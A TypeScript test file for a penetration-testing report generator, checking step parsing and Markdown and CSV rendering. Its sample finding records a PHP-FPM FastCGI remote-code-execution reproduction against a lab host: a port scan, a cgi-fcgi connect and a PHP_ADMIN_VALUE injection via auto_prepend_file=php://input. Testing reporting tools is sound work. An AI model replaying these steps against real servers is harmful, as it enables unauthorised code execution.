import assert from "node:assert/strict";
import { test } from "node:test";
import {
  deriveFindingSections,
  extractReportSection,
  findingSafeFilename,
  findingsToCsv,
  parseReproductionSteps,
  renderFindingsSummaryMarkdown,
  renderSingleFindingMarkdown,
  type Finding,
} from "./index.js";

const SAMPLE_FINDING: Finding = {
  id: "13e44c81-1718-44b0-aa1f-0979c786e8f3",
  taskId: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
  title: "CloudFunc 靶机 PHP-FPM 9000 端口未授权暴露 → PHP_ADMIN_VALUE 注入 RCE（www-data → metadata.sock）",
  asset: "10.0.160.240",
  vulnClass: "CWE-306",
  severity: "critical",
  cvss: "9.8",
  confidence: "firm",
  status: "verified",
  endpoint: "tcp://10.0.160.240:9000 (FastCGI / php-fpm, PHP/5.6.40, docroot /var/www/html)",
  dedupKey: "10.0.160.240|cwe-306|tcp://10.0.160.240:9000",
  intentId: null,
  factIds: [],
  evidence: [{ path: "findings/fpm-rce.txt", sha256: "a".repeat(64) }],
  repro: [
    "1) nmap -Pn -p- 10.0.160.240 → 80 与 9000 开放 (9000 = php-fpm FastCGI).",
    "2) env -i REQUEST_METHOD=GET SCRIPT_FILENAME=/var/www/html/index.php cgi-fcgi -bind -connect 10.0.160.240:9000 → 返回登录页 HTML 且 X-Powered-By: PHP/5.6.40.",
    "3) 注入 PHP_ADMIN_VALUE=$'open_basedir=/\\nallow_url_include=1\\nauto_prepend_file=php://input' → 输出 uid=33(www-data).",
  ].join("\n"),
  impact: "",
  fix: "",
  pocCurl: "cgi-fcgi -bind -connect 10.0.160.240:9000",
  createdAt: "2026-11-27T02:40:00.000Z",
  verifiedAt: "2026-11-27T02:45:31.000Z",
  verifiedBy: "w1-13e44c81",
};

test("parseReproductionSteps parses 1) / 2) / 3) steps and preserves full command bodies", () => {
  const steps = parseReproductionSteps({ repro: SAMPLE_FINDING.repro });
  assert.equal(steps.length, 3);
  assert.equal(steps[0]!.number, 1);
  assert.match(steps[0]!.body, /nmap -Pn -p- 10\.0\.160\.240/);
  assert.equal(steps[2]!.number, 3);
  assert.match(steps[2]!.body, /PHP_ADMIN_VALUE/);
});

test("parseReproductionSteps parses ARTEX ### 步骤 headings without splitting inside code fences", () => {
  const report = [
    "## 概述",
    "PHP-FPM 未授权 RCE。",
    "",
    "## 复现步骤",
    "### 步骤 1：端口识别",
    "```bash",
    "# 1) comment inside fence must not create a new step",
    "1. line inside fence",
    "nmap -p 9000 10.0.160.240",
    "```",
    "### 步骤 2：FastCGI 代码执行",
    "发送构造的 PHP_ADMIN_VALUE 请求。",
    "",
    "## 根因分析",
    "FastCGI 监听 0.0.0.0:9000 且未配置 allowed_clients。",
  ].join("\n");

  const steps = parseReproductionSteps({ report });
  assert.equal(steps.length, 2);
  assert.equal(steps[0]!.title, "端口识别");
  assert.match(steps[0]!.body, /1\. line inside fence/);
  assert.equal(steps[1]!.title, "FastCGI 代码执行");
  assert.equal(extractReportSection(report, ["根因分析"]), "FastCGI 监听 0.0.0.0:9000 且未配置 allowed_clients。");
});

test("deriveFindingSections & renderSingleFindingMarkdown synthesize complete ARTEX sections for legacy findings", () => {
  const derived = deriveFindingSections(SAMPLE_FINDING, {
    facts: [{ id: "f1", title: "FastCGI 暴露面确认", summary: "listen = 0.0.0.0:9000 且无监听白名单限制" }],
  });
  assert.equal(derived.rootCauseSource, "context");
  assert.match(derived.rootCause, /listen = 0\.0\.0\.0:9000/);
  assert.match(derived.fix, /127\.0\.0\.1|Unix Socket/);

  const md = renderSingleFindingMarkdown(SAMPLE_FINDING);
  for (const heading of ["## 概述", "## 影响与危害", "## 受影响范围", "## 复现步骤", "### 步骤 1：", "## PoC", "## 根因分析", "## 修复建议", "## 封存证据清单"]) {
    assert.ok(md.includes(heading), `missing heading: ${heading}`);
  }
});

test("renderFindingsSummaryMarkdown & findingsToCsv & findingSafeFilename produce valid deliverables", () => {
  const summaryMd = renderFindingsSummaryMarkdown([SAMPLE_FINDING], {
    taskId: SAMPLE_FINDING.taskId,
    taskTitle: "tsecbench-auto",
    targets: ["10.0.0.0/8"],
  });
  assert.match(summaryMd, /# 渗透测试漏洞发现报告 — tsecbench-auto/);
  assert.match(summaryMd, /## 风险统计摘要/);
  assert.match(summaryMd, /## 漏洞总览清单/);
  assert.match(summaryMd, /### 1\. \[CRITICAL · 严重\]/);

  const csv = findingsToCsv([SAMPLE_FINDING]);
  assert.ok(csv.startsWith("\uFEFFID,严重等级,标题"));
  assert.match(csv, /CWE-306/);

  const fname = findingSafeFilename(SAMPLE_FINDING);
  assert.ok(fname.endsWith(".md"));
  assert.ok(!fname.includes("/"));
});
